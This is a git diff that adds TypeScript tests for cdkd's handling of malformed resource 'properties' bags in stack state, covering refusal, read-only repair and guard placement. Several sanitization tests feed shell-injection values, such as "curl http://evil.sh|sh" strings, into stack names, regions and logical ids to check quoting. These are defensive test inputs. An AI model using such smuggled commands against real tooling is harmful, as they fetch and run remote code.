@@ -14,17 +14,22 @@ import {
   malformedOutputsRefusalMessage,
   malformedOutputsWarning,
   malformedRenderedContainersWarning,
+  malformedResourcePropertiesRefusalMessage,
+  malformedResourcePropertiesWarning,
   malformedResourcesWarning,
   malformedStateRefusalMessage,
   refuseMalformedNestedChildOutputs,
   refuseMalformedOutputs,
   refuseMalformedOutputsForDestroy,
+  refuseMalformedResourceProperties,
   refuseMalformedState,
   repairMalformedOutputsForReadOnly,
+  repairMalformedResourcePropertiesForReadOnly,
   repairMalformedResourcesForReadOnly,
+  unreadableResourcePropertyBags,
   type RenderedStateContainer,
 } from '../../../src/state/malformed-resources-bag.js';
-import { UNRENDERABLE } from '../../../src/utils/display-safe.js';
+import { IDENT_MAX_CODE_POINTS, UNRENDERABLE } from '../../../src/utils/display-safe.js';
 import { isMarkedNonRetryable } from '../../../src/deployment/retryable-errors.js';
 import { CdkdError } from '../../../src/utils/error-handler.js';
 import type { StackState } from '../../../src/types/state.js';
@@ -1658,5 +1663,429 @@ describe('the retried refusals are marked non-retryable (issue #3207)', () => {
     expect(() =>
       refuseMalformedNestedChildOutputs({ outputs: { A: 'v' } }, 'P~C', 'us-east-1')
     ).not.toThrow();
+  });
+});
+
+/**
+ * The `properties` container (issue
+ * [go-to-k/cdkd#3191](https://github.com/go-to-k/cdkd/issues/3191)) — a THIRD
+ * container, one level down from the two above, on each resource ENTRY.
+ */
+function withProperties(properties: unknown, extra: Record<string, unknown> = {}): StackState {
+  return state({
+    A: { physicalId: 'p', resourceType: 'T', properties },
+    ...extra,
+  });
+}
+
+describe('unreadableResourcePropertyBags (issue go-to-k/cdkd#3191)', () => {
+  for (const [label, value] of UNREADABLE) {
+    it(`names an entry whose bag is ${label}`, () => {
+      expect(unreadableResourcePropertyBags(withProperties(value))).toEqual(['A']);
+    });
+  }
+
+  it('names nothing for a populated bag', () => {
+    expect(unreadableResourcePropertyBags(withProperties({ K: 'v' }))).toEqual([]);
+  });
+
+  it('names nothing for an EMPTY bag — {} is a legitimate declared-nothing record', () => {
+    // The shape closest to the defect, and the one a widened predicate would
+    // catch: a resource that genuinely declares no properties must keep
+    // deploying.
+    expect(unreadableResourcePropertyBags(withProperties({}))).toEqual([]);
+  });
+
+  it('SKIPS an entry that is not a readable object, leaving that class to its own guard', () => {
+    // ORDER-INDEPENDENCE with the entry-level guard go-to-k/cdkd#3226 adds. A
+    // `null` entry has no `properties` to test and a string entry's would be a
+    // per-character read of the entry's own defect, so naming either here
+    // would report this container for another one's damage — and the verdict
+    // would then depend on which guard ran first.
+    expect(unreadableResourcePropertyBags(state({ A: null, B: 'torn', C: 5 }))).toEqual([]);
+  });
+
+  for (const [label, value] of UNREADABLE) {
+    it(`returns [] rather than ids invented from a ${label} resources BAG`, () => {
+      // A string bag would otherwise yield one "logical id" per character.
+      expect(unreadableResourcePropertyBags(state(value))).toEqual([]);
+    });
+  }
+
+  it('names every damaged entry, in record order', () => {
+    expect(
+      unreadableResourcePropertyBags(
+        state({
+          A: { physicalId: 'p', resourceType: 'T', properties: 'x' },
+          B: { physicalId: 'p', resourceType: 'T', properties: { K: 'v' } },
+          C: { physicalId: 'p', resourceType: 'T', properties: null },
+        })
+      )
+    ).toEqual(['A', 'C']);
+  });
+});
+
+describe('refuseMalformedResourceProperties (issue go-to-k/cdkd#3191)', () => {
+  it('throws the shared code, marked non-retryable', () => {
+    let thrown: unknown;
+    try {
+      refuseMalformedResourceProperties(withProperties('x'), 'S', 'us-east-1');
+    } catch (e) {
+      thrown = e;
+    }
+    expect(thrown).toBeInstanceOf(CdkdError);
+    expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
+    // A verdict taken from a PERSISTED record cannot change on a retry, and
+    // the message interpolates record-derived text a substring-matching retry
+    // classifier reads as transient (issue #1838).
+    expect(isMarkedNonRetryable(thrown as Error)).toBe(true);
+  });
+
+  it('does not throw for a healthy record', () => {
+    expect(() =>
+      refuseMalformedResourceProperties(withProperties({ K: 'v' }), 'S', 'us-east-1')
+    ).not.toThrow();
+  });
+
+  it('does not throw for an unreadable resources BAG — that is refuseMalformedState', () => {
+    // Taking only ONE of the two guards is the caller error both predicates'
+    // docs warn about; this pins that THIS one stays silent rather than
+    // inventing per-character ids.
+    expect(() => refuseMalformedResourceProperties(state('ab'), 'S', 'us-east-1')).not.toThrow();
+  });
+});
+
+describe('repairMalformedResourcePropertiesForReadOnly (issue go-to-k/cdkd#3191)', () => {
+  it('empties each unreadable bag and returns the ids', () => {
+    const s = withProperties('abcdef', {
+      B: { physicalId: 'p', resourceType: 'T', properties: { K: 'v' } },
+    });
+    expect(repairMalformedResourcePropertiesForReadOnly(s)).toEqual(['A']);
+    expect(s.resources['A']!.properties).toEqual({});
+    // A REPAIR of the bag, not a DROP of the entry: the row still names a real
+    // resource and belongs in the diff, and dropping it would preview a CREATE
+    // the next deploy does not make.
+    expect(s.resources['A']!.resourceType).toBe('T');
+    expect(s.resources['A']!.physicalId).toBe('p');
+  });
+
+  it('leaves a healthy bag byte-identical and reports no repair', () => {
+    const bag = { K: 'v' };
+    const s = withProperties(bag);
+    expect(repairMalformedResourcePropertiesForReadOnly(s)).toEqual([]);
+    expect(s.resources['A']!.properties).toBe(bag);
+  });
+});
+
+describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
+  it('the REFUSAL names no stack at all when the caller holds no trusted one', () => {
+    // `src/analyzer/diff-calculator.ts` is that caller: the only identity in
+    // its reach is the record's own unvalidated `stackName` / `region`, so a
+    // planted pair would aim the pasteable remedy at a different, healthy
+    // stack. It passes neither, and the text degrades to a TEMPLATE.
+    // `ParamZeta`, not `A`: the clause itself says "declares as ADDED" and "is
+    // A REPLACEMENT", so `toContain('A')` passes even when the id list renders
+    // NOTHING. The sibling file (`diff-recursive-malformed-properties.test.ts`)
+    // documents that trap and picks this same id for it; the rule just had not
+    // been applied here.
+    const text = malformedResourcePropertiesRefusalMessage(undefined, undefined, ['ParamZeta']);
+    expect(text).toContain('The state record this command loaded holds 1 resource record(s)');
+    expect(text).toContain('cdkd state show <stack> --stack-region <region> --json');
+    expect(text).toContain('ParamZeta');
+    expect(text.split('\n')).toHaveLength(1);
+  });
+
+  it('states the consequence the OTHER containers cannot produce', () => {
+    // Deliberately NOT `malformedStateRefusalMessage`'s wording: an unreadable
+    // `resources` MAP reads as an empty stack, while this reads as a resource
+    // whose declared properties are all missing — a REPLACEMENT, not a
+    // re-create-the-world.
+    const text = malformedResourcePropertiesRefusalMessage('S', 'us-east-1', ['A']);
+    expect(text).toContain('REPLACEMENT of the live resource');
+    // The negative is pinned against the SIBLING's real wording, taken from
+    // `malformedStateRefusalMessage` itself so it cannot go stale. An earlier
+    // revision asserted a phrase that exists in no `src/` file, so it stayed
+    // green even against the merge it exists to prevent (review of #3191).
+    expect(malformedStateRefusalMessage('S', 'us-east-1')).toContain(
+      'replace the evidence with a well-formed empty one'
+    );
+    expect(text).not.toContain('replace the evidence with a well-formed empty one');
+  });
+
+  it('records why repairing is not the safe alternative for this container', () => {
+    // The measurement that settled the contract: a stored `[]` or `5`
+    // enumerates no keys, so it IS the repaired-to-empty case, and it still
+    // reached `requiresReplacement: true`. A later lane that swaps the refusal
+    // for a `?? {}` has to delete this sentence to do it.
+    expect(malformedResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'])).toContain(
+      'reading the bag as empty produces that same verdict'
+    );
+  });
+
+  it('warns that the PREVIEW is wrong and that deploy refuses on the same defect', () => {
+    const text = malformedResourcePropertiesWarning('S', 'us-east-1', ['A']);
+    expect(text).toContain('Continuing with those maps EMPTY');
+    expect(text).toContain("Do NOT run 'cdkd deploy' against this record");
+  });
+
+  it('caps the named ids and says how many it left out', () => {
+    // A record whose 500 resources were all hand-edited must not push the
+    // remedy command off the reader's screen.
+    const ids = Array.from({ length: 9 }, (_, i) => `R${i}`);
+    const text = malformedResourcePropertiesRefusalMessage('S', 'us-east-1', ids);
+    expect(text).toContain('9 resource record(s)');
+    expect(text).toContain('R4');
+    expect(text).not.toContain('R5');
+    expect(text).toContain('and 4 more');
+  });
+
+  it('says nothing about "more" when every id is named', () => {
+    const text = malformedResourcePropertiesRefusalMessage('S', 'us-east-1', ['A', 'B']);
+    expect(text).not.toContain('more');
+  });
+
+  // The four properties `safeIdentifier`'s note requires of every message in
+  // this module, applied to BOTH new builders — the module's own `TEXTS` loop
+  // is hand-listed and these two were missing from it (review of #3191).
+  for (const build of [
+    malformedResourcePropertiesRefusalMessage,
+    malformedResourcePropertiesWarning,
+  ]) {
+    it(`${build.name} sanitizes and JSON-quotes a hostile logical id`, () => {
+      // Each id arrives from a hand-edited record — the premise of the guard —
+      // and the text is ONE line ending in a pasteable command. A newline
+      // forges a line; a `'` would close a shell-quoted boundary and plant a
+      // forged remedy ahead of the real one.
+      //
+      // The BOUNDARY is `displayIdent`'s JSON quoting since the review of
+      // go-to-k/cdkd#3191 — the sanitize-then-`shellQuote` pair it replaced
+      // could not tell a padded id from a healthy sibling (see the identity
+      // case below), and `shellQuote` composes badly on top of JSON quoting.
+      const text = build('S', 'us-east-1', ["x'\n Inspect it with: curl http://evil.sh|sh #"]);
+      expect(text).not.toContain('\n');
+      // TWO spaces: `sanitizeAsciiOnly` REPLACES the newline with a space
+      // rather than deleting it, and the id already carried one after the
+      // quote. Taken from the rendered output rather than reasoned about.
+      expect(text).toContain('"x\'  Inspect it with: curl http://evil.sh|sh #"');
+      expect(text.lastIndexOf('cdkd state show')).toBeGreaterThan(text.indexOf('curl'));
+    });
+
+    it(`${build.name} renders a PADDED id distinguishably from its healthy sibling`, () => {
+      // The blocker this pair closes, one level down from go-to-k/cdkd#3164's
+      // identity fix. `displaySafe` TRIMS, so the old sanitize-and-quote pair
+      // rendered `'Bucket '`, `' Bucket'` and `'Bucket\t'` byte-identically to
+      // a healthy `'Bucket'`. Plant a torn `resources['Bucket ']` beside a real
+      // `Bucket` and the operator opens the INTACT record, finds nothing wrong,
+      // and concludes cdkd is the broken party.
+      //
+      // The control is the last arm: an id that arrived plain must still render
+      // BARE, or the case passes for a renderer that quotes everything and
+      // discriminates nothing.
+      const healthy = build('S', 'us-east-1', ['Bucket']);
+      for (const padded of ['Bucket ', ' Bucket', 'Bucket\t', 'Bucket ']) {
+        const text = build('S', 'us-east-1', [padded]);
+        expect(text).not.toBe(healthy);
+        expect(text).toContain('"Bucket"');
+      }
+      expect(healthy).toContain(' — Bucket — ');
+      expect(healthy).not.toContain('"Bucket"');
+    });
+
+    it(`${build.name} marks a truncated id as CUT rather than with an ambiguous ellipsis`, () => {
+      // `Prod...` is a legal logical id, so the `...` tail the pre-review
+      // renderer emitted was indistinguishable from content.
+      const text = build('S', 'us-east-1', ['B'.repeat(IDENT_MAX_CODE_POINTS + 7)]);
+      expect(text).toContain('[cut: 7 more characters withheld]');
+      expect(text).not.toContain('B...');
+    });
+
+    it(`${build.name} renders an id that sanitizes to nothing as ${UNRENDERABLE}`, () => {
+      // An empty argument would read as a missing name rather than a damaged
+      // one — the same reason `safeIdentifier` never returns ''.
+      expect(build('S', 'us-east-1', ['\u0000\u0007'])).toContain(UNRENDERABLE);
+    });
+
+    it(`${build.name} shell-quotes a HOSTILE stack name and keeps the command last`, () => {
+      // The stack name reaches a message in this module from an S3 key, so it
+      // is no more trusted than a logical id. Probe 7 mutated only the ids.
+      const hostile = "a'; curl http://x|sh; echo '";
+      const text = build(hostile, 'us-east-1', ['A']);
+      expect(text).not.toContain(`${hostile} --stack-region`);
+      expect(text.split('\n')).toHaveLength(1);
+      expect(text.lastIndexOf('cdkd state show')).toBeGreaterThan(text.indexOf('curl'));
+    });
+
+    it(`${build.name} shell-quotes a HOSTILE region`, () => {
+      const text = build('S', "r'; curl http://x|sh; echo '", ['A']);
+      expect(text).toMatch(/--stack-region 'r'\\''/);
+      expect(text.split('\n')).toHaveLength(1);
+    });
+
+    it(`${build.name} renders a stack name that sanitizes to EMPTY as ${UNRENDERABLE}`, () => {
+      expect(build('\u0000\u0001', 'us-east-1', ['A'])).toContain(UNRENDERABLE);
+    });
+
+    it(`${build.name} CAPS a multi-kilobyte stack name so the remedy stays on screen`, () => {
+      const long = build('q'.repeat(5000), 'us-east-1', ['A']);
+      expect(long).toContain(`${'q'.repeat(128)}...`);
+      expect(long).toContain('cdkd state show');
+      expect(long.length).toBeLessThan(2500);
+    });
+
+    it(`${build.name} caps a multi-kilobyte LOGICAL ID at the id's own length`, () => {
+      // NOT the shared helper's 128: a CloudFormation logical id is valid up
+      // to IDENT_MAX_CODE_POINTS, and truncating a legitimate one names no
+      // record. The at-cap arm is the control — without it the case also
+      // passes for a renderer that cuts everything.
+      const long = build('S', 'us-east-1', ['z'.repeat(5000)]);
+      expect(long).toContain('z'.repeat(IDENT_MAX_CODE_POINTS));
+      expect(long).not.toContain('z'.repeat(IDENT_MAX_CODE_POINTS + 1));
+      expect(long.length).toBeLessThan(2500);
+      expect(build('S', 'us-east-1', ['z'.repeat(IDENT_MAX_CODE_POINTS)])).not.toContain(
+        'withheld'
+      );
+    });
+
+    it(`${build.name} REFUSES an empty id list rather than rendering "holds 0"`, () => {
+      // Both callers guard, but these are exported and a later one need not.
+      expect(() => build('S', 'us-east-1', [])).toThrow(/at least one logical id/);
+    });
+
+    it(`${build.name} drops the region clause and the flag when the region is absent`, () => {
+      // A v1 record predates the region-prefixed key layout. A placeholder
+      // would put a `--stack-region` into a pasted command that selects no
+      // record at all.
+      const text = build('S', undefined, ['A']);
+      expect(text).not.toContain('--stack-region');
+      expect(text).toContain('cdkd state show S --json');
+    });
+  }
+});
+
+/**
+ * The `properties` container's own source fence (issue
+ * [go-to-k/cdkd#3191](https://github.com/go-to-k/cdkd/issues/3191)).
+ *
+ * DOMINANCE, not presence — the same shape, and the same reason, as the two
+ * fences above. go-to-k/cdkd#3018's first cut was a POSITION error: twelve
+ * `?? {}` guards each sitting one line BELOW the dereference they meant to
+ * protect. A fence asserting only that the guard exists stays green through
+ * exactly that, and this guard's whole placement argument is that ONE call at
+ * `calculateDiff`'s entry dominates all five `currentResource.properties`
+ * reads below it.
+ */
+describe('the properties-container guards dominate their reads (issue go-to-k/cdkd#3191)', () => {
+  const CALCULATOR = 'src/analyzer/diff-calculator.ts';
+  const DIFF_LOAD = 'src/cli/commands/diff-recursive.ts';
+
+  it(`${CALCULATOR} REFUSES, above its first properties read`, () => {
+    const src = code(CALCULATOR);
+    const refusalAt = src.indexOf('refuseMalformedResourceProperties(');
+    expect(
+      refusalAt,
+      `${CALCULATOR} no longer refuses an unreadable properties bag. Every cdkd deploy diff ` +
+        `enters here, and an unreadable bag reads as a resource whose declared properties are ` +
+        `all missing — a REPLACEMENT of the live resource for a create-only one.`
+    ).toBeGreaterThan(-1);
+    // The anchor is the first of the five reads: the type-change UPDATE's
+    // record. A refusal below it leaves the wrong verdict computed one line
+    // above the guard meant to prevent it.
+    const derefAt = 'currentProperties: currentResource.properties';
+    const derefIndex = src.indexOf(derefAt);
+    expect(
+      derefIndex,
+      `${CALCULATOR} no longer contains its first properties read \`${derefAt}\`; this fence's ` +
+        `anchor is stale and it is no longer checking dominance.`
+    ).toBeGreaterThan(-1);
+    expect(
+      refusalAt,
+      `${CALCULATOR} refuses AFTER its first \`currentResource.properties\` read, so the ` +
+        `comparison it protects already ran — the exact shape go-to-k/cdkd#3018's first cut ` +
+        `shipped.`
+    ).toBeLessThan(derefIndex);
+    // DOMINANCE has two more failure modes a single index compare cannot see,
+    // and probe 9 only moved the call DOWN (review of go-to-k/cdkd#3191).
+    //
+    // (a) A read added ABOVE the guard. Anchoring on the FIRST read only says
+    // the guard precedes THAT one, so assert the guard precedes EVERY
+    // `currentResource.properties` read in the file.
+    const everyRead = [...src.matchAll(/currentResource\.properties/g)].map((m) => m.index ?? -1);
+    expect(everyRead.length, `${CALCULATOR} no longer reads currentResource.properties`).toBeGreaterThanOrEqual(5);
+    expect(
+      Math.min(...everyRead),
+      `${CALCULATOR} reads \`currentResource.properties\` BEFORE the refusal. The anchor below ` +
+        `is the first read as of go-to-k/cdkd#3191; a read added above the guard is the same ` +
+        `defect one line earlier.`
+    ).toBeGreaterThan(refusalAt);
+    // (b) The guard wrapped in a condition. A refusal that only sometimes runs
+    // is not a refusal; the call must sit at statement position.
+    expect(
+      src,
+      `${CALCULATOR}'s refusal is no longer an unconditional statement — a guard behind an ` +
+        `\`if\` runs on the caller's terms rather than on the record's.`
+    ).toMatch(/\n\s*refuseMalformedResourceProperties\(/);
+    // And it must pass NO identity: the only pair in reach is the record's own
+    // unvalidated self-report, which would aim the remedy at another stack.
+    expect(
+      src,
+      `${CALCULATOR} passes an identity to the refusal. The only one in reach is ` +
+        `\`currentState.stackName\` / \`.region\`, fields of the record being declared ` +
+        `malformed — a planted pair names a different, healthy stack.`
+    ).toContain('refuseMalformedResourceProperties(currentState, undefined, undefined)');
+    // And it must not take the read-only helper instead: this module is
+    // reached by cdkd deploy, which provisions.
+    expect(
+      src.includes('repairMalformedResourcePropertiesForReadOnly'),
+      `${CALCULATOR} repairs instead of refusing. Measured on this tree, a bag repaired to {} ` +
+        `reaches the SAME requiresReplacement verdict as the torn one, so the repair ` +
+        `reproduces the data loss rather than avoiding it.`
+    ).toBe(false);
+  });
+
+  it(`${DIFF_LOAD} REPAIRS — cdkd diff persists nothing and must still report`, () => {
+    const src = code(DIFF_LOAD);
+    const repairAt = src.indexOf('repairMalformedResourcePropertiesForReadOnly(');
+    expect(
+      repairAt,
+      `${DIFF_LOAD} no longer repairs an unreadable properties bag at the load, so cdkd diff ` +
+        `inherits the calculator's refusal and stops reporting on the record a user runs it to ` +
+        `inspect.`
+    ).toBeGreaterThan(-1);
+    // It must WARN, because an empty bag is indistinguishable from a resource
+    // that genuinely declares nothing — a silent repair is its own defect.
+    expect(
+      src.includes('malformedResourcePropertiesWarning('),
+      `${DIFF_LOAD} repairs silently; the preview it then prints is wrong in a way nothing says.`
+    ).toBe(true);
+    // AFTER the bag repair: an unreadable `resources` map has no entries to
+    // walk, and the entry predicate deliberately returns [] for one.
+    const bagRepairAt = src.indexOf('repairMalformedResourcesForReadOnly(');
+    expect(
+      bagRepairAt,
+      `${DIFF_LOAD} no longer repairs the resources bag; this fence's anchor is stale.`
+    ).toBeGreaterThan(-1);
+    expect(
+      bagRepairAt,
+      `${DIFF_LOAD} repairs the properties bags BEFORE the resources bag, so a record damaged ` +
+        `at the root walks no entries and the per-entry warning never fires.`
+    ).toBeLessThan(repairAt);
+
+    // A SECOND repair, after the rollback-orphan splice. `state.orphans` is a
+    // container the load never walks, and `computeStackDiff` merges the
+    // adopted records straight into the bag it hands the calculator — so one
+    // repair at the load is NOT sufficient here, unlike for the two other
+    // containers. Without it `cdkd diff` aborted with the deploy's refusal.
+    const spliceAt = src.indexOf('...plan.adopted');
+    expect(
+      spliceAt,
+      `${DIFF_LOAD} no longer splices adopted orphan records; this fence's anchor is stale.`
+    ).toBeGreaterThan(-1);
+    const secondRepairAt = src.indexOf('repairMalformedResourcePropertiesForReadOnly(', repairAt + 1);
+    expect(
+      secondRepairAt,
+      `${DIFF_LOAD} repairs the properties bags only once. The rollback-orphan splice adds ` +
+        `records from \`state.orphans[].state\`, which the load never walked, so a torn one ` +
+        `reaches calculateDiff and ABORTS cdkd diff with the deploy's refusal.`
+    ).toBeGreaterThan(spliceAt);
   });
 });
